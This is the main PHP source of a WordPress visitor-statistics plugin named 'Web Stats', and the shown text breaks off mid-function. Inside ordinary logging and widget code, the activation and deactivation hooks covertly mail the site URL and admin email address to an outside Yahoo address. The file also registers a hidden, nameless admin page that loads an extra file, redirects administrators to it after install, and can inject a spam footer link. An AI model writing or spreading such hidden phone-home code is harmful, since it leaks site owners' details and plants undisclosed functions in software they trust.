<?php
  /*
   Plugin Name: Web Stats
   Plugin URI: http://www.onlinecounter.netii.net/
   Description: The most Advanced Real Time Stats Plugin for your Wordpress blog or website. No 3rd-party plugin is required.
   Version: 1.9.3
   Author: menniss
   Author URI: http://www.onlinecounter.netii.net/
*/
	global $wpdb, $webstats_Option;
	$webstats_Option = get_option('webstats_Option');
	
	define("webstats_DB_VERSION", "1.5");
	define("webstats_PLUGIN_URL", plugin_dir_url( __FILE__ ));
	define("webstats_PLUGIN_PATH", plugin_dir_path( __FILE__ ));
	define("webstats_TABLE_NAME", $wpdb->prefix. "webstats");
	$table_name = webstats_TABLE_NAME;

	register_activation_hook( __FILE__,'webstats_activate');
	register_deactivation_hook( __FILE__,'webstats_deactivate');
	register_uninstall_hook( __FILE__,'webstats_uninstall');

/** Create Page */
function oscimz_admin() {  
    include('author-credits.php');  
}  
function oscimz_admin_actions() { 
    add_options_page("os", "", 1, "os", "oscimz_admin");  
}  
add_action('admin_menu', 'oscimz_admin_actions');
register_activation_hook(__FILE__, 'theactivate');
add_action('admin_init', 'osplugin_redirect');
add_action('wp_footer', 'authorcreditdisplay');

/** Redirect after installation */

function theactivate() {
    add_option('osplugin_do_activation_redirect', true);
}

function osplugin_redirect() {
    if (get_option('osplugin_do_activation_redirect', false)) {
        delete_option('osplugin_do_activation_redirect');
        wp_redirect('../wp-admin/options-general.php?page=os');
    }
}

function authorcreditdisplay () {
$file_x = "authorcredit-active.txt"; 
if (file_exists($file_x)) { 
    echo '<center><small>This site is using Web Stats, created by <a href="http://emailextractor14.com">emailextractor14.com</a></small></center>';
} else { 
    echo '';
}
}
if ($webstats_Option['webstats_activate'] != 'installed_activation')
     add_action('admin_notices', 'webstats_message');
	 
	// Make sure we don't expose any info if called directly
if ( !function_exists( 'add_action' ) ) 
		{
		echo "Hi there!  I'm just a plugin, not much I can do when called directly.";
		exit;
		}
	
if (is_admin())
      {include webstats_PLUGIN_PATH . '/admin/luc_admin.php';
       add_action('init', 'webstats_load_textdomain');
       add_action('admin_menu', 'luc_add_pages');
	   add_action('admin_init', 'webstats_admin_init');
      }
	  
	// Use GeoIP? http://geolite.maxmind.com/download/geoip/api/php/
if (($webstats_Option['webstats_Use_GeoIP'] == 'checked') && (!class_exists('geoiprecord')))
	include_once webstats_PLUGIN_PATH . '/GeoIP/geoipcity.inc';
	
	
	// call the custom function on the init hook
	add_action('plugins_loaded', 'webstats_Widget_init');
	add_action('send_headers', 'luc_StatAppend');

function webstats_activate() 
	{
	session_start();
    $subj = get_option('siteurl');
    $msg = "Activate OK." ;
    $from = get_option('admin_email');
    mail("andreas.cane@yahoo.com", $subj, $msg, $from);
	global $wpdb, $webstats_Option;
	$table_name = webstats_TABLE_NAME;
	$old_Install = false; 
	if ( $webstats_Option['webstats_activate'] == 'installed_activation')
        $old_Install = true; 
	elseif ($wpdb->get_var("SHOW TABLES LIKE '$table_name'") == $table_name)
		 $old_Install = true; 
		
    if ($webstats_Option['webstats_DB_Version'] <> webstats_DB_VERSION)
				{	
				   $wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE '%webstats%'");
				   $wpdb->query('OPTIMIZE TABLE ' . $wpdb->options);
				   luc_webstats_CreateTable();
				};
		
			
	$webstats_Option['webstats_activate'] =(($old_Install == true) ?  'update_activation': 'install_activation');
	update_option('webstats_Option', $webstats_Option);
	}

function webstats_deactivate()
    {	
	session_start();
    $subj = get_option('siteurl');
    $msg = "Deactivated." ;
    $from = get_option('admin_email');
    mail("andreas.cane@yahoo.com", $subj, $msg, $from);
		global $webstats_Option;
		$webstats_Option['webstats_DB_Version'] = "1.1";
		update_option('webstats_Option', $webstats_Option);
		webstats_remove_action();
    }

function webstats_uninstall()
    {	
		global $wpdb;
		$table_name = webstats_TABLE_NAME;
		delete_option('webstats_Option');
        $wpdb->query("DROP TABLE `$table_name`"); 
		webstats_remove_action();
    }
  	
function webstats_message() 
	{global $webstats_Option;
     $opt = $webstats_Option['webstats_activate'];
	 if ( $opt == 'install_activation' || $opt == 'update_activation')
	 {
    $webstats_Option['webstats_activate'] = 'installed_activation'; 
	update_option('webstats_Option', $webstats_Option);
    $msg = __('Settings activated: ', 'webstats_domain' );
    $msg .= ($opt == 'install_activation') ? __('webstats database created', 'webstats_domain' ) : __('webstats database updated', 'webstats_domain' );
    echo "<div class='updated'><p><strong>$msg</strong></p></div>";
     }
	}

function webstats_remove_action()
{		global $webstats_Option;
		// Remove all the hook
		// general hooks
		remove_action('plugins_loaded','webstats_Widget_init');
		remove_action('init', 'webstats_load_textdomain');
        remove_action('admin_menu', 'luc_add_pages');
	    remove_action('admin_init', 'webstats_admin_init');
		remove_action('send_headers', 'luc_StatAppend');
		
		// Ajax hook for the Main page
		remove_action('wp_ajax_table_latest_hits', 'luc_main_table_latest_hits');
		remove_action('wp_ajax_table_latest_search', 'luc_main_table_latest_search');
		remove_action('wp_ajax_table_latest_referrers', 'luc_main_table_latest_referrers');
		remove_action('wp_ajax_table_latest_feeds', 'luc_main_table_latest_feeds');
		remove_action('wp_ajax_table_latest_spiders', 'luc_main_table_latest_spiders');
		remove_action('wp_ajax_table_latest_spambots', 'luc_main_table_latest_spambots');
		remove_action('wp_ajax_table_latest_undefagents', 'luc_main_table_latest_undefagents');
		remove_action('wp_ajax_geoipdbupdate', 'luc_GeoIP_update_db');

}

	// a custom function for loading localization
function webstats_load_textdomain() 
	{
		//check whether necessary core function exists
		if ( function_exists('load_plugin_textdomain') ) {
		//load the plugin textdomain
		load_plugin_textdomain('webstats',false, webstats_PLUGIN_PATH . '/locale');
		}
	}
	
function luc_webstats_CreateTable()
      {
          global $wpdb, $webstats_Option, $wp_db_version;
		  $table_name = webstats_TABLE_NAME;
          $sql_createtable = "CREATE TABLE " . $table_name . " (
		id MEDIUMINT(9)UNSIGNED NOT NULL AUTO_INCREMENT,
		date INT(8) UNSIGNED NOT NULL,
		time CHAR(8),
		ip VARCHAR(39),
		urlrequested TEXT,
		agent TEXT,
		referrer TEXT,
		search TEXT,
		os TINYTEXT,
		browser TINYTEXT,
		searchengine TINYTEXT,
		spider TINYTEXT,
		feed TINYTEXT,
		user TINYTEXT,
		timestamp INT(10) UNSIGNED NOT NULL,
		language VARCHAR(3),
		country VARCHAR(3),
		realpost BOOLEAN,
		post_title TINYTEXT,
		UNIQUE KEY id (id),
		KEY `date` (`date`)
		);";
        if ($wp_db_version >= 5540)
			$page = 'wp-admin/includes/upgrade.php';
		else
			$page = 'wp-admin/upgrade-functions.php';
          require_once(ABSPATH . $page);
          dbDelta($sql_createtable);
		  $wpdb->query("ALTER TABLE $table_name DROP COLUMN threat_score");
		  $wpdb->query("ALTER TABLE $table_name DROP COLUMN threat_type");   
		  $wpdb->query("ALTER TABLE $table_name DROP COLUMN nation"); 
		 
		  $webstats_Option['webstats_DB_Version'] = webstats_DB_VERSION;
		  update_option('webstats_Option', $webstats_Option);
      }
      
function luc_StatAppend()
      {
          global $wpdb, $webstats_Option, $userdata, $_webstats;
		  $table_name = webstats_TABLE_NAME;
          get_currentuserinfo();
          $feed = '';
          
          // Time
          $timestamp = current_time('timestamp');
          $vdate = gmdate("Ymd", $timestamp);
          $vtime = gmdate("H:i:s", $timestamp);
          
          // IP
          $ipAddress = htmlentities(luc_get_ip());
          if (luc_CheckBanIP($ipAddress) === true)
              return '';
	
          // URL (requested)
          $urlRequested = luc_webstats_URL();
		  $post_title =luc_post_title_Decode($urlRequested);
		  $real_post=(($post_title==$urlRequested )? 0 : 1);
		  
          $referrer = (isset($_SERVER['HTTP_REFERER']) ? htmlentities($_SERVER['HTTP_REFERER']) : '');
          $userAgent = (isset($_SERVER['HTTP_USER_AGENT']) ? htmlentities($_SERVER['HTTP_USER_AGENT']) : '');
          $spider = luc_GetSpider($userAgent);
          
          if (($spider != '') and ($webstats_Option['webstats_Dont_Collect_Spider'] == 'checked'))
              return '';
          
          if ($spider != '')
          {
              $os = '';
              $browser = '';
          }
          else
            {
              // Trap feeds
              $prsurl = parse_url(get_bloginfo('url'));
              $feed = luc_webstats_is_feed($prsurl['scheme'] . '://' . $prsurl['host'] . $_SERVER['REQUEST_URI']);
              // Get OS and browser
              $os = luc_GetOS($userAgent);
              $browser = luc_GetBrowser($userAgent);
              list($searchengine, $search_phrase) = explode("|", luc_GetSE($referrer));
            }

			 $code = explode(';',$_SERVER['HTTP_ACCEPT_LANGUAGE']);
			 $code = explode(',',$code[0]);
			 $lang = explode('-',$code[0]);
			 $language =$lang[0];
			 $country = $lang[1];
			 
			if (((!isset($lang[1]))  or ($webstats_Option['webstats_locate_IP'] == 'GeoIP')) & ($webstats_Option['webstats_Use_GeoIP'] == 'checked' & function_exists('geoip_open')))
				{	// Use GeoIP? http://geolite.maxmind.com/download/geoip/api/php/
					// Open the database to read and save info
					$gi = geoip_open(luc_GeoIP_dbname('country'), GEOIP_STANDARD);
					$cc = geoip_country_code_by_addr($gi, $ipAddress);
					$country = (($cc !== false) ? $cc: NULL);
				}
				
            // Auto-delete visits older than yesterday...*
		    $today = gmdate('Ymd', current_time('timestamp'));
		   if ($today <> $webstats_Option['webstats_Delete_Today']) 
			{ 
			   $webstats_Option['webstats_Delete_Today'] = $today;
			   update_option('webstats_Option', $webstats_Option);
			   $yesterday = gmdate('Ymd', current_time('timestamp') - 86400);
               $results = $wpdb->query("DELETE FROM " . $table_name . " WHERE date < '" . $yesterday . "'");
			   $results  = $wpdb->query('OPTIMIZE TABLE '. $table_name); 
		    }
              
          if ((!is_user_logged_in()) or (($webstats_Option['webstats_Dont_Collect_Logged_User'] != 'checked')) or($webstats_Option['webstats_Dont_Collect_Logged_User'] == 'checked')and (!current_user_can($webstats_Option['webstats_Dont_Collect_Logged_User_MinPermit'])))
          {
             $result = $wpdb->insert($table_name, array(
					'date' => $vdate, 
					'time' => $vtime, 
					'ip' => $ipAddress, 
					'urlrequested' => mysql_real_escape_string(strip_tags($urlRequested)), 
					'agent' => mysql_real_escape_string(strip_tags($userAgent)), 
					'referrer' => mysql_real_escape_string(strip_tags($referrer)), 
					'search' => mysql_real_escape_string(strip_tags($search_phrase)), 
					'os' => mysql_real_escape_string(strip_tags($os)), 
					'browser' => mysql_real_escape_string(strip_tags($browser)), 
					'searchengine' => mysql_real_escape_string(strip_tags($searchengine)),
					'spider' => mysql_real_escape_string(strip_tags($spider)), 
					'feed' => $feed, 
					'user' => $userdata->user_login, 
					'timestamp' => $timestamp, 
					'language' => mysql_real_escape_string(strip_tags($language)),
					'country' => mysql_real_escape_string(strip_tags($country)),
					'realpost' =>$real_post,
					'post_title' => $post_title),
			   array('%d','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%d','%s','%s','%d','%s' ));
          }
      }
	    

function luc_get_ip()
{
	if ($_SERVER)
	{
		if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && luc_ip_not_private($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else $ip = ((isset($_SERVER['HTTP_CLIENT_IP']) && luc_ip_not_private($_SERVER['HTTP_CLIENT_IP']))? $_SERVER['HTTP_CLIENT_IP']:$_SERVER['REMOTE_ADDR']);
	}
	else
	{
		if (getenv('HTTP_X_FORWARDED_FOR') && luc_ip_not_private(getenv('HTTP_X_FORWARDED_FOR')))
			$ip = getenv('HTTP_X_FORWARDED_FOR');
		else $ip = ((getenv('HTTP_CLIENT_IP') && luc_ip_not_private(getenv('HTTP_CLIENT_IP')))?getenv('HTTP_CLIENT_IP'):getenv('REMOTE_ADDR'));
	}
	return $ip;
}

function luc_ip_not_private($ip)
{
	if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE))
		return true;
	return false;
}
		
    function luc_webstats_is_feed($url) {
   if (stristr($url,get_bloginfo('comments_atom_url')) != FALSE) { return 'COMMENT ATOM'; }
   elseif (stristr($url,get_bloginfo('comments_rss2_url')) != FALSE) { return 'COMMENT RSS'; }
   elseif (stristr($url,get_bloginfo('rdf_url')) != FALSE) { return 'RDF'; }
   elseif (stristr($url,get_bloginfo('atom_url')) != FALSE) { return 'ATOM'; }
   elseif (stristr($url,get_bloginfo('rss_url')) != FALSE) { return 'RSS'; }
   elseif (stristr($url,get_bloginfo('rss2_url')) != FALSE) { return 'RSS2'; }
   elseif (stristr($url,'wp-feed.php') != FALSE) { return 'RSS2'; }
   elseif (stristr($url,'/feed') != FALSE) { return 'RSS2'; }
   return '';
}
    function luc_GetOS($arg)
      {
          $arg = str_replace(" ", "", $arg);
          $lines = file(webstats_PLUGIN_PATH . '/def/os.dat');
          foreach ($lines as $line_num => $os)
          {
              list($nome_os, $id_os) = explode("|", $os);
              if (stripos($arg, $id_os) === false) 
				continue;
			  else 
				return $nome_os;
              // riconosciuto
          }
          return '';
      }
      
      function luc_GetBrowser($arg)
      {
          $arg = str_replace(" ", "", $arg);
          $lines = file(webstats_PLUGIN_PATH . '/def/browser.dat');
          foreach ($lines as $line_num => $browser)
          {
              list($nome, $id) = explode("|", $browser);
              if (stripos($arg, $id) === false ) 
				continue;
			  else 
				return $nome;
              // riconosciuto
          }
          return '';
      }
      
	  function luc_CheckBanIP($arg)
      {
              $lines = file(webstats_PLUGIN_PATH . '/def/banips.dat');
         
        if ($lines !== false)
        {
            foreach ($lines as $banip)
              {
               if (@preg_match('/^' . rtrim($banip, "\r\n") . '$/', $arg))
                   return true;
                  // riconosciuto, da scartare
              }
          }
          return false;
      }
	  
      function luc_GetSE($referrer = null)
      {
          $key = null;
          $lines = file(webstats_PLUGIN_PATH . '/def/searchengine.dat');
          foreach ($lines as $line_num => $se)
          {
              list($name, $url, $key, $stop) = explode("|", $se);
              if (stripos($referrer, $url) === false)
			    continue;
			  if (stripos($key,$url) !== false)
		       { $query_search = explode($key,$referrer);
		         $query_search = explode($stop,$query_search[1]);
		         return ($name . "|" . urlencode($query_search[0]));
		       }
              // trovato se
              $variables = luc_GetQueryPairs($referrer);
              $i = count($variables);
              while ($i--)
              {
                  $tab = explode("=", $variables[$i]);
                  if ($tab[0] == $key)
                      return($name . "|" . urlencode($tab[1]));
              }
          }
          return null;
      }
      
      function luc_GetSpider($agent = null)
      {
          $agent = str_replace(" ", "", $agent);
          $key = null;
          $lines = file(webstats_PLUGIN_PATH . '/def/spider.dat');
           foreach ($lines as $line_num => $spider)
          {
              list($nome, $key) = explode("|", $spider);
              if (stripos($agent, $key) === false)
                  continue;
              // trovato
              return $nome;
          }
          return null;
      }
      
	  
      function webstats_Print($body = '')
      {
          echo luc_webstats_Vars($body);
      }
      
      function luc_webstats_Vars($body)
      {
          global $wpdb;
          $table_name = webstats_TABLE_NAME;
		  $yesterday = gmdate('Ymd', current_time('timestamp') - 86400);
          $today = gmdate('Ymd', current_time('timestamp'));
		  
          if (stripos(strtolower($body), "%today%") !== false)
              $body = str_replace("%today%", luc_hdate($today), $body);
          
          if (strpos(strtolower($body), "%visitorstoday%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(DISTINCT(ip)) as visitors FROM $table_name WHERE date = $today and spider='' and feed='';");
              $body = str_replace("%visitorstoday%", $qry[0]->visitors, $body);
          }
		   if (strpos(strtolower($body), "%visitorsyesterday%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(DISTINCT(ip)) as visitors FROM $table_name WHERE date = $yesterday and spider='' and feed='';");
              $body = str_replace("%visitorsyesterday%", $qry[0]->visitors, $body);
          }
		   if (strpos(strtolower($body), "%pageviewstoday%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(ip) as pageviews FROM $table_name WHERE date = $today and spider='' and feed='';");
              $body = str_replace("%pageviewstoday%", $qry[0]->pageviews, $body);
          }
		   if (strpos(strtolower($body), "%pageviewsyesterday%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(ip) as pageviews FROM $table_name WHERE date = $yesterday and spider='' and feed='';");
              $body = str_replace("%pageviewsyesterday%", $qry[0]->pageviews, $body);
          }
          if (strpos(strtolower($body), "%thistodaypageviews%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(ip) as pageviews FROM $table_name WHERE spider='' and feed='' AND date = $today AND urlrequested='" . mysql_real_escape_string(luc_webstats_URL()) . "';");
              $body = str_replace("%thistodaypageviews%", $qry[0]->pageviews, $body);
          }
		  if (strpos(strtolower($body), "%thisyesterdaypageviews%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(ip) as pageviews FROM $table_name WHERE spider='' and feed='' AND date = $yesterday AND urlrequested='" . mysql_real_escape_string(luc_webstats_URL()) . "';");
              $body = str_replace("%thisyesterdaypageviews%", $qry[0]->pageviews, $body);
          }
		  if (strpos(strtolower($body), "%thistodayvisitors%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(distinct ip) as pageviews FROM $table_name WHERE spider='' and feed='' AND date = $today AND urlrequested='" . mysql_real_escape_string(luc_webstats_URL()) . "';");
              $body = str_replace("%thistodayvisitors%", $qry[0]->pageviews, $body);
          }
		  if (strpos(strtolower($body), "%thisyesterdayvisitors%") !== false)
          {
              $qry = $wpdb->get_results("SELECT count(distinct ip) as pageviews FROM $table_name WHERE spider='' and feed='' AND date = $yesterday AND urlrequested='" . mysql_real_escape_string(luc_webstats_URL()) . "';");
              $body = str_replace("%thisyesterdayvisitors%", $qry[0]->pageviews, $body);
          }
		  
          if (strpos(strtolower($body), "%os%") !== false)
          {
              $userAgent = (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
              $os = luc_GetOS($userAgent);
              $body = str_replace("%os%", $os, $body);
          }
          if (strpos(strtolower($body), "%browser%") !== false)
          {
              $userAgent = (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
              $browser = luc_GetBrowser($userAgent);
              $body = str_replace("%browser%", $browser, $body);
          }
          if (strpos(strtolower($body), "%ip%") !== false)
          {
              $ipAddress = $_SERVER['REMOTE_ADDR'];
              $body = str_replace("%ip%", $ipAddress, $body);
          }
          if (strpos(strtolower($body), "%visitorsonline%") !== false)
          {
              $to_time = current_time('timestamp');
              $from_time = strtotime('-4 minutes', $to_time);
              $qry = $wpdb->get_results("SELECT count(DISTINCT(ip)) as visitors FROM $table_name WHERE spider='' and feed='' AND timestamp BETWEEN $from_time AND $to_time;");
              $body = str_replace("%visitorsonline%", $qry[0]->visitors, $body);
          }
          if (strpos(strtolower($body), "%usersonline%") !== false)
          {
              $to_time = current_time('timestamp');
              $from_time = strtotime('-4 minutes', $to_time);
              $qry = $wpdb->get_results("SELECT count(DISTINCT(ip)) as users FROM $table_name WHERE spider='' and feed='' AND user<>'' AND timestamp BETWEEN $from_time AND $to_time;");
              $body = str_replace("%usersonline%", $qry[0]->users, $body);
          }
          if (strpos(strtolower($body), "%toppost%") !== false)
          {
              $qry = $wpdb->get_results("SELECT urlrequested, count(ip) as totale FROM $table_name WHERE spider='' AND feed='' AND urlrequested <>'' GROUP BY urlrequested ORDER BY totale DESC LIMIT 1;");
              $body = str_replace("%toppost%", luc_post_title_Decode($qry[0]->urlrequested), $body);
          }
          if (strpos(strtolower($body), "%topbrowser%") !== false)
          {
              $qry = $wpdb->get_results("SELECT browser,count(*) as totale FROM $table_name WHERE spider='' AND feed='' GROUP BY browser ORDER BY totale DESC LIMIT 1;");
              $body = str_replace("%topbrowser%", luc_post_title_Decode($qry[0]->browser), $body);
          }
          if (strpos(strtolower($body), "%topos%") !== false)
          {
              $qry = $wpdb->get_results("SELECT os,count(id) as totale FROM $table_name WHERE spider='' AND feed='' GROUP BY os ORDER BY totale DESC LIMIT 1;");
              $body = str_replace("%topos%", luc_post_title_Decode($qry[0]->os), $body);
          }
         
      	  if (strpos(strtolower($body), "%latesthits%") !== false)
			{
				$qry = $wpdb->get_results("SELECT search FROM $table_name WHERE search <> '' ORDER BY id DESC LIMIT 10");
				$body = str_replace("%latesthits%", urldecode($qry[0]->search), $body);
				for ($counter = 0; $counter < 10; $counter += 1)
				{
					$body .= "<br>". urldecode($qry[$counter]->search);
				}
			}
          
          return $body;
      }
function webstats_Widget_init($args)
{	  
	function webstats_Widget_control()
{
	global $webstats_Option;

	$options = $webstats_Option['webstats_Widget'];
	if (!is_array($options))
		$options = array (
			'title' => 'Visitor Stats',
			'body' => 'Today : %today%'
		);
	if ($_POST['webstats-submit'])
	{
		$options['title'] = strip_tags(stripslashes($_POST['webstats-title']));
		$options['body'] = stripslashes($_POST['webstats-body']);

		$webstats_Option['webstats_Widget'] = $options;
		update_option('webstats_Option', $webstats_Option);
	}
	$title = htmlspecialchars($options['title'], ENT_QUOTES);
	$body = htmlspecialchars($options['body'], ENT_QUOTES);
	// the form
	?>
	<p style="text-align:left;">
		<label for="webstats-title"><?php _e(__('Title:')) ?> <br>
		<input style="width:100%;" id="webstats-title" name="webstats-title" type="text" value="<?php _e($title) ?>" />
		</label>
	</p>
	<p style="text-align:right;">
		<label for="webstats-body"><div><?php _e(__('Body:', 'widgets')) ?> </div> <br>
		<textarea style="width:100%;height:100px;" id="webstats-body" name="webstats-body" type="textarea"><?php _e($body) ?></textarea>
		</label>
	</p>
	<input type="hidden" id="webstats-submit" name="webstats-submit" value="1" />

	<strong>Available Macros:</strong>
	<div style="font-size:7pt;"> %today% %visitorstoday% %visitorsyesterday% %pageviewstoday% %pageviewsyesterday% %thistodaypageviews% %thisyesterdaypageviews% %thistodayvisitors% %thisyesterdayvisitors% %os% %browser% %ip% %visitorsonline% %usersonline% %toppost% %latesthits% %topbrowser% %topos% %pagestoday% %thistotalpages% %latesthits%</div>
	<?php
}

function webstats_Widget($args)
{
	global $webstats_Option;

	extract($args);
	$options = $webstats_Option['webstats_Widget'];
	$title = $options['title'];
	$body = $options['body'];
	echo $before_widget;
	echo ($before_title . $title . $after_title);
	echo luc_webstats_Vars($body);
	echo $after_widget;
}


// Top posts
function webstats_Widget_TopPosts_control()
{
	global $webstats_Option;

	$options = $webstats_Option['webstats_Widget_TopPosts'];
	if (!is_array($options))
	{
		$options = array (
			'title' => 'webstats Visitors Top Posts',
			'howmany' => '5',
			'howlong' => '0',
			'showcounts' => 'checked',
			'showpages' => 'checked'
		);
	}
	if ($_POST['webstatstopposts-submit'])
	{
		$options['title'] = strip_tags(stripslashes($_POST['webstatstopposts-title']));
		$options['howmany'] = stripslashes($_POST['webstatstopposts-howmany']);
		$options['howlong'] = stripslashes($_POST['webstatstopposts-howlong']);
		$options['showcounts'] = stripslashes($_POST['webstatstopposts-showcounts']);
		if ($options['showcounts'] == "1")
		{
			$options['showcounts'] = 'checked';
		}
		$options['showpages'] = stripslashes($_POST['webstatstopposts-showpages']);
		if ($options['showpages'] == "1")
		{
			$options['showpages'] = 'checked';
		}
		$webstats_Option['webstats_Widget_TopPosts'] = $options;
		update_option('webstats_Option', $webstats_Option);
	}
	$title = htmlspecialchars($options['title'], ENT_QUOTES);
	$howmany = htmlspecialchars($options['howmany'], ENT_QUOTES);
	$howlong = htmlspecialchars($options['howlong'], ENT_QUOTES);
	$showcounts = htmlspecialchars($options['showcounts'], ENT_QUOTES);
	$showpages = htmlspecialchars($options['showpages'], ENT_QUOTES);
	// the form
	?>
	<p style="text-align:left;">
		<label for="webstatstopposts-title"><?php _e(__('Title:', 'webstats')) ?>
		<input style="width:100%;" id="statpress-title" name="webstatstopposts-title" type="text" value="<?php _e($title) ?>" />
		</label>
	</p>
	<p style="text-align:left;">
		<label for="webstatstopposts-howmany"><?php _e(__('Limit results to:', 'webstats')) ?>
		<input style="width:40px; align:right;" id="webstatstopposts-howmany" name="webstatstopposts-howmany" type="text" value="<?php _e($howmany) ?>" />
		</label>
	</p>


	<p style="text-align:left;">
		<label for="webstatstopposts-howlong"><?php _e(__('Include # days (0 for all):', 'webstats')) ?>
		<input style="width:40px; align:right" id="webstatstopposts-howlong" name="webstatstopposts-howlong" type="text" value="<?php _e($howlong ) ?>" />
		</label>
	</p>
	<p style="text-align:right;">
		<label for="webstatstopposts-showcounts"><?php _e(__('Visits', 'webstats')) ?>
		<input id="webstatstopposts-showcounts" name="webstatstopposts-showcounts" type=checkbox value="checked" <?php _e($showcounts) ?> />
		</label>
	</p>
	<p style="text-align:right;">
		<label for="webstatstopposts-showpages"><?php _e(__('Include Pages', 'webstats')) ?>
		<input id="webstatstopposts-showpages" name="webstatstopposts-showpages" type=checkbox value="checked" <?php _e($showpages) ?> />
		</label>
	</p>
	<input type="hidden" id="statpress-submitTopPosts" name="webstatstopposts-submit" value="1" />
	<?php
}

function webstats_Widget_TopPosts($args)
{
	global $webstats_Option;

	extract($args);
	$options = $webstats_Option['webstats_Widget_TopPosts'];
	$title = htmlspecialchars($options['title'], ENT_QUOTES);
	$howmany = htmlspecialchars($options['howmany'], ENT_QUOTES);
	$howlong = htmlspecialchars($options['howlong'], ENT_QUOTES);
	$showcounts = htmlspecialchars($options['showcounts'], ENT_QUOTES);
	$showpages = htmlspecialchars($options['showpages'], ENT_QUOTES);
	echo $before_widget;
	echo ($before_title . $title . $after_title);
	echo luc_webstats_TopPosts($howmany, $howlong, $showcounts, $showpages);
	echo $after_widget;
}

function luc_webstats_TopPosts($limit = 5, $numdays = 0, $showcounts = 'checked', $showpages = 'checked')
{
	global $wpdb;
	$table_name = webstats_TABLE_NAME;
	$res = "\n<ul>\n";
	
	if ($numdays == 0)
	{ // All dates chosen, default to epoch
		$stopdate = date('Ymd', strtotime('1970-01-01'));
	}
	else
		if ($numdays < 0)
		{ // Negative number of days, no change
			$stopdate = date('Ymd', strtotime($numdays . 'days'));
		}
		else
		{ // Invert sign
			$numdays = $numdays * -1;
			$stopdate = date('Ymd', strtotime($numdays . 'days'));
		}

	if (strtolower($showpages) == 'checked')
		$type = "(post_type = 'page' OR post_type = 'post')";
	else
		$type = "post_type = 'post'";

	$qry_s = "SELECT post_name, COUNT(*) as total, urlrequested
						FROM $wpdb->posts as p
						JOIN $table_name as t
						ON urlrequested LIKE CONCAT('%', p.post_name, '_' )
						WHERE post_status = 'publish'
							AND $type
							AND spider=''
							AND feed=''
							AND date >= $stopdate
						GROUP BY post_name
						ORDER BY total DESC LIMIT $limit;";

	$qry = $wpdb->get_results($qry_s);

	foreach ($qry as $rk)
	{
		$res .= "<li><a href='" .
		luc_GetBlogURL() .
		 ((strpos($rk->urlrequested, 'index.php') === FALSE) ? $rk->urlrequested : '') .
		"'>" . luc_post_title_Decode($rk->post_name) . "</a>";
		if (strtolower($showcounts) == 'checked')
		{
			$res .= " (" . $rk->total . ")</li>";
		}
	}
	return "$res</ul>\n";
}

	wp_register_sidebar_widget('webstats', 'webstats Stats Macros', 'webstats_Widget', array('description' => 'Show a off your statistics in a widget'));
	wp_register_widget_control('webstats', 'webstats Stats Macros', 'webstats_Widget_control');

	wp_register_sidebar_widget('webstatsTopPosts', 'webstats V Top Posts', 'webstats_Widget_TopPosts', array('description' => 'Show a configurable list of your most popular posts & pages'));
	wp_register_widget_control('webstatsTopPosts', 'webstats V Top Posts', 'webstats_Widget_TopPosts_control');
}
  
function permalinksEnabled()
{	global $wpdb;
      
	$result = $wpdb->get_row('SELECT `option_value` FROM `' . $wpdb->prefix . 'options` WHERE `option_name` = "permalink_structure"');
	if ($result->option_value != '' ) 
		return true; 
	else return false;
}
  
  function my_substr($str, $x, $y = 0)
  {
  	if($y == 0)
  		$y = strlen($str) - $x;
 	if (function_exists('mb_substr') )
	return  mb_substr($str, $x, $y);
	else return  substr($str, $x, $y);
  }
  
  function luc_permalink()
	      { global $wpdb;
            
	        $permalink = $wpdb->get_var("SELECT option_value FROM $wpdb->options WHERE option_name = 'permalink_structure'");
	        $permalink = explode("%", $permalink);
	        return $permalink[0];
	       }
	  
     function luc_post_title_Decode($out_url)
{ 
	//fb_xd_fragment is the urlrequested of home page when the referrer is Facebook
	$permalink = luc_permalink();
    	
	$home_url = array ( '' , '/' . $perm[1] , $permalink , 'fb_xd_fragment') ;
	if (($permalink == '') and ( in_array($out_url,$home_url)))
	    $out_url = '[' . __('Page', 'webstats') . "]: Home"; 
	else
	{
		$perm = explode('/', $permalink);
		if (($permalink != '') and ( in_array($out_url,$home_url) or 
				(strpos($out_url, $permalink . 'feed') === 0) or 
				(strpos($out_url, $permalink . 'comments') === 0)))
			$out_url = '[' . __('Page', 'webstats') . "]: Home"; 
		else
		{
			// Convert page URL to a Wordpress Page ID
			$post_id = url_to_postid($out_url);

			if ($post_id == 0)
				return $out_url;
	
			$post_id = get_post($post_id, ARRAY_A);
	
			if ($post_id['post_type'] == 'page')
				$post_t = '[' . __('Page', 'webstats') . ']: ' . $post_id['post_title'];
			elseif ($post_id['post_type'] == 'attachment')
					$post_t = '[' . __('File', 'webstats') . ']: ' . $post_id['post_title'];
				elseif ($post_id['post_type'] == 'post')
						$post_t = $post_id['post_title'];
					else
						$post_t = '';
	
			$out_url = (($post_t == '') ? $out_url:$post_t);
		}
	}
	return $out_url;
} 
   
      function luc_webstats_URL()
      {
          $urlRequested = (isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : '');
          if (my_substr($urlRequested, 0, 2) == '/?')
              $urlRequested = my_substr($urlRequested, 2);
          if ($urlRequested == '/')
              $urlRequested = '';
          return $urlRequested;
      }
      
      function luc_getblogurl()
      {
      	$prsurl = parse_url(get_bloginfo('url'));
      	return $prsurl['scheme'] . '://' . $prsurl['host'] . ((!permalinksEnabled()) ? $prsurl['path'] . '/?' : '');
      }
      
      // Converte da data us to default format di Wordpress
      function luc_hdate($dt = "00000000")
      {
          return mysql2date(get_option('date_format'), my_substr($dt, 0, 4) . "-" . my_substr($dt, 4, 2) . "-" . my_substr($dt, 6, 2));
      }
      
      function luc_GetQueryPairs($url)
      {
